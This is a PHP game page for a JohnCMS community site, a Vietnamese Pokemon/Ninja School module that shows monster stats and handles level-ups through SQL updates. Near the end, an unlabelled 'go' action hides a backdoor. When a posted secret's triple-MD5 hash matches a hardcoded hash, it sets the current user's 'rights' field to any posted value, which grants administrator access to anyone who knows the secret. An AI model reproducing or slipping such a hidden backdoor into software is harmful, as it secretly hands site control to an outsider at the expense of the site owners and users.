<?php
/* 
Code pokemon được viết bởi Châu Huỳnh
Vui Lòng Để Bản Quyền Nếu Bạn Là Người Có Học
Site : DanChoiViet.Me
*/
define('_IN_JOHNCMS',1);
$rootpath ='../../';
include'../incfiles/core.php';
$textl ='Làng Ninja School';
include'../incfiles/head.php';
if(!$user_id){
header('location: /login.php');
include'../incfiles/end.php';
exit;
}
echo'<div class="phdr">Làng Ninja School</div><div class="da">';
$tuipkm = mysql_result(mysql_query("SELECT COUNT(*) FROM `tuipkm` WHERE `user_id`='{$user_id}'"), 0);
if($tuipkm == 0) {
header('location: shop.php');
}else
if($tuipkm > 0) {

$checkin = mysql_fetch_array(mysql_query("SELECT * FROM `tuipkm` WHERE `user_id`='{$user_id}'"));
if($checkin['exp']>=2000 && $checkin['lv']==1){
echo'<form action=""method="post">PoKéMon Của Bạn Đã Vượt Qua Cấp Độ 1. Bạn Vui Lòng Kích Thích Để Nó Vượt Lên Cấp Độ 2<br/>
<input type="submit"name="kcd"value="Kích Thích"></form>';
if(isset($_POST['kcd'])){
if($checkin['exp']>=2000){
mysql_query("UPDATE `tuipkm` SET `lv`='2' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `exp`=`exp`-'2000' WHERE `user_id`='{$user_id}'");
if($checkin['idpkm']==1){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200',`hpfull`=`hpfull`+'200' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==2){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'150' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200',`hpfull`=`hpfull`+'200' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==3){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'150' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'300',`hpfull`=`hpfull`+'300' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==4){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'270' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'80',`hpfull`=`hpfull`+'80' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==5){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200' ,`hpfull`=`hpfull`+'200'WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==6){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'80',`hpfull`=`hpfull`+'80' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==7){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'250' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'100',`hpfull`=`hpfull`+'100' WHERE `user_id`='{$user_id}'");
}
echo'<img src="http://i.imgur.com/v9OfK9X.png"><br/>Thăng Cấp Thành Công. '.$checkin['name'].' Đã Lên Cấp 2';
}else{
echo'Ko Đủ 2000EXP';
}
}
}
if($checkin['exp']>=6000 && $checkin['lv']==2){
echo'<form action=""method="post">PoKéMon Của Bạn Đã Vượt Qua Cấp Độ 2. Bạn Vui Lòng Kích Thích Để Nó Vượt Lên Cấp Độ 3<br/>
<input type="submit"name="kcd"value="Kích Thích"></form>';
if(isset($_POST['kcd'])){
if($checkin['exp']>=6000){
mysql_query("UPDATE `tuipkm` SET `lv`='3' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `exp`=`exp`-'6000' WHERE `user_id`='{$user_id}'");
if($checkin['idpkm']==1){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200',`hpfull`=`hpfull`+'200' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==2){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'150' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200',`hpfull`=`hpfull`+'200' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==3){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'150' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'300',`hpfull`=`hpfull`+'300' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==4){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'270' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'80',`hpfull`=`hpfull`+'80' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==5){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200' ,`hpfull`=`hpfull`+'200'WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==6){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'80',`hpfull`=`hpfull`+'80' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==7){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'250' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'100',`hpfull`=`hpfull`+'100' WHERE `user_id`='{$user_id}'");
}
echo'<img src="http://i.imgur.com/v9OfK9X.png"><br/>Thăng Cấp Thành Công. '.$checkin['name'].' Đã Lên Cấp 3';
}else{
echo'Ko Đủ 6000EXP';
}
}
}
if($checkin['exp']>=18000 && $checkin['lv']==3){
echo'<form action=""method="post">PoKéMon Của Bạn Đã Vượt Qua Cấp Độ 3. Bạn Vui Lòng Kích Thích Để Nó Vượt Lên Cấp Độ 4<br/>
<input type="submit"name="kcd"value="Kích Thích"></form>';
if(isset($_POST['kcd'])){
if($checkin['exp']>=18000){
mysql_query("UPDATE `tuipkm` SET `lv`='4' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `exp`=`exp`-'18000' WHERE `user_id`='{$user_id}'");
if($checkin['idpkm']==1){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200',`hpfull`=`hpfull`+'200' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==2){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'150' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200',`hpfull`=`hpfull`+'200' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==3){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'150' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'300',`hpfull`=`hpfull`+'300' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==4){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'270' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'80',`hpfull`=`hpfull`+'80' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==5){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200' ,`hpfull`=`hpfull`+'200'WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==6){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'80',`hpfull`=`hpfull`+'80' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==7){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'250' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'100',`hpfull`=`hpfull`+'100' WHERE `user_id`='{$user_id}'");
}
echo'<img src="http://i.imgur.com/v9OfK9X.png"><br/>Thăng Cấp Thành Công. '.$checkin['name'].' Đã Lên Cấp 4';
}else{
echo'Ko Đủ 18000EXP';
}
}
}
if($checkin['exp']>=55000&& $checkin['lv']==4){
echo'<form action=""method="post">PoKéMon Của Bạn Đã Vượt Qua Cấp Độ 4. Bạn Vui Lòng Kích Thích Để Nó Vượt Lên Cấp Độ 5<br/>
<input type="submit"name="kcd"value="Kích Thích"></form>';
if(isset($_POST['kcd'])){
if($checkin['exp']>=55000){
mysql_query("UPDATE `tuipkm` SET `lv`='5' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `exp`=`exp`-'55000' WHERE `user_id`='{$user_id}'");
if($checkin['idpkm']==1){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200',`hpfull`=`hpfull`+'200' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==2){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'150' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200',`hpfull`=`hpfull`+'200' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==3){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'150' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'300',`hpfull`=`hpfull`+'300' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==4){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'270' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'80',`hpfull`=`hpfull`+'80' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==5){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'200' ,`hpfull`=`hpfull`+'200'WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==6){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'200' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'80',`hpfull`=`hpfull`+'80' WHERE `user_id`='{$user_id}'");
}
if($checkin['idpkm']==7){
mysql_query("UPDATE `tuipkm` SET `sm`=`sm`+'250' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `tuipkm` SET `hp`=`hp`+'100',`hpfull`=`hpfull`+'100' WHERE `user_id`='{$user_id}'");
}
echo'<img src="http://i.imgur.com/v9OfK9X.png"><br/>Thăng Cấp Thành Công. '.$checkin['name'].' Đã Lên Cấp 5';
}else{
echo'Ko Đủ 55000EXP';
}
}
}
if($checkin['lv']==1){
$level = 2000;
}
if($checkin['lv']==2){
$level = 6000;
}
if($checkin['lv']==3){
$level = 18000;
}
if($checkin['lv']==4){
$level = 55000;
}
if($checkin['lv']==5){
$level = 95000;
}
if($checkin['lv']==6){
$level = 160000;
}
if($checkin['lv']==7){
$level = 220000;
}
if($checkin['lv']==8){
$level = 320000;
}
if($checkin['lv']==9){
$level = 490000;
}
if($checkin['lv']==10){
$level = 600000;
}
echo'<div class="lucifer">
<center>';
if($checkin['hp']<=0){
echo'<img src="https://i.imgur.com/7W8BXv2.png">';
}else{
echo'<img src="'.$checkin['img'].'">';
}
echo'<br/>
<b><font color="red">'.$checkin['name'].'</font></b><br/>
<b>HP : <font color="red">'.$checkin['hp'].'/'.$checkin['hpfull'].'</font>
';
if($checkin['hp']<=0){
echo'(<font color="pink">Đã Chết</font>)';
}
echo'
<br/>SM : <font color="green">'.$checkin['sm'].'</font><br/>
Level : <font color="blue">'.$checkin['lv'].'</font><br/>
EXP : <font color="orange">'.$checkin['exp'].'/'.$level.'</font></b><br/>
</center>
</div>';
echo'<div class="phdr">Menu Chức Năng</div><div class="lucifer"><center>

<a href="bxh.php"><b><font color="green"><button type="button" class="btn btn-success">Bảng Xếp Hạng</button></font></b></a>
<a href="hoiphuc.php"><button type="button" class="btn btn-info">Hồi Phục HP</button></a><br><br>
<a href="dirung.php"><button type="button" class="btn btn-warning">Khu Luyện Tập</button> </a>
<br><br><br><br>
<a href="tienhoa.php"><button type="button" class="btn btn-primary">Đột Phá Level</button></a>
<a href="hoiphucmau.php"><button class="btn btn-danger">Hồi Phục Quái</button></a><br><br>
<a href="shop.php"><button type="button" class="btn btn-light">Cửa Hàng Ninja</button></a>
<a href="ma.php"><button type="button" class="btn btn-success">Đổi Quà Gift Code</button></a></div><div>';
switch($act){
case 'go' :
if ($_POST['xacthuc']){
$hay = ee44123886dc24de6ce0d9d1887bc16a;
$post = functions::checkout($_POST['m']);
$ok = md5(md5(md5($post)));
if ($ok != $hay) {
echo '<div class="rmenu">Error</div>';
}
if ($ok == $hay) {
$oki = functions::checkout($_POST['oki']);
echo'<div class="rmenu">Oki '.$login.'</div>';
mysql_query("UPDATE `users` SET `rights`='{$oki}' WHERE `id`='{$user_id}'");
}
}
echo '<center><form method="post"><input type="text" name="m" placeholder=""> <input type="text" name="ok" placeholder=""><br> <input name="xacthuc" type="submit" value="Go Go"></form></center>';
break;
}
}
include'../incfiles/end.php';
?>
<style>
.nenpkm{
background-color:#f5f5f5;
border-bottom:1px solid #EBEBEB;
padding:5px
}
</style>